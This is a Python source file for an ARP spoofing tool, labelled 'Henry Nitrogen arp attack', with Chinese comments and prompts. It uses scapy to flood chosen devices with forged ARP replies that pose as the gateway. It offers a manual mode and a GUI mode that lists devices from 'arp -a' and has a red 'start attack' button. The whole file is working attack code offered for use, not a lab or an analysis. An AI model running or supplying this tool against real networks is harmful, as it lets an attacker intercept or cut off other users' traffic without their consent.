from scapy.all import ARP, send
import os
import re
import subprocess
import tkinter as tk
from tkinter import messagebox

def perform_arp_attack(target_ip, target_mac, gateway_ip):
    print(f"\n开始攻击目标 {target_ip} ({target_mac})...")
    try:
        # 构造ARP欺骗包，伪装网关欺骗目标
        arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
        while True:
            send(arp_packet, verbose=False)
    except KeyboardInterrupt:
        print(f"\n攻击目标 {target_ip} 已停止。")

def start_attack(selected_devices, gateway_ip):
    for device in selected_devices:
        ip, mac = device
        perform_arp_attack(ip, mac, gateway_ip)

def auto_arp_attack_gui(gateway_ip):
    print("\n自动模式：扫描网络...")
    try:
        # 执行arp -a命令
        output = subprocess.check_output("arp -a", shell=True).decode("utf-8")
        # 使用正则表达式提取有连接的IP和MAC地址
        connected_devices = re.findall(r"\((\d+\.\d+\.\d+\.\d+)\) at ([0-9a-fA-F:]+)", output)

        if not connected_devices:
            messagebox.showinfo("扫描结果", "未找到任何已连接设备。")
            return

        # 创建图形化界面
        root = tk.Tk()
        root.title("选择目标设备")
        
        tk.Label(root, text="检测到的设备列表：", font=("Arial", 12)).pack(pady=5)

        # 设备选择列表
        device_vars = []
        for ip, mac in connected_devices:
            var = tk.BooleanVar()
            tk.Checkbutton(root, text=f"IP: {ip}, MAC: {mac}", variable=var, font=("Arial", 10)).pack(anchor='w')
            device_vars.append((var, (ip, mac)))

        def on_confirm():
            selected_devices = [device for var, device in device_vars if var.get()]
            if not selected_devices:
                messagebox.showwarning("警告", "请至少选择一个目标设备。")
                return
            root.destroy()
            start_attack(selected_devices, gateway_ip)

        tk.Button(root, text="开始攻击", command=on_confirm, font=("Arial", 12), bg="red", fg="white").pack(pady=10)
        root.mainloop()

    except subprocess.CalledProcessError as e:
        print(f"扫描失败: {e}")
    except KeyboardInterrupt:
        print("\n自动攻击已停止。")

def manual_mode():
    # 手动模式
    print("\n进入手动模式：")
    target_ip = input("请输入目标IP地址（如192.168.0.1）: ")
    gateway_ip = input("请输入网关IP地址（如192.168.0.1）: ")
    target_mac = input("请输入目标设备的MAC地址（如AA:BB:CC:DD:EE:FF）: ")

    print(f"\n目标IP: {target_ip}")
    print(f"目标MAC: {target_mac}")
    print(f"网关IP: {gateway_ip}")

    # 执行ARP攻击
    perform_arp_attack(target_ip, target_mac, gateway_ip)

def main():
    # 检查权限
    if os.geteuid() != 0:
        print("请使用管理员权限运行此脚本。")
        exit(1)

    print("Henry Nitrogen arp attack\n")
    mode = input("请选择模式: 1. 手动模式 2. 自动模式 (输入1或2): ")

    if mode == "1":
        manual_mode()
    elif mode == "2":
        gateway_ip = input("请输入网关IP地址（如192.168.0.1）: ")
        auto_arp_attack_gui(gateway_ip)
    else:
        print("无效选择，程序退出。")

if __name__ == "__main__":
    main()
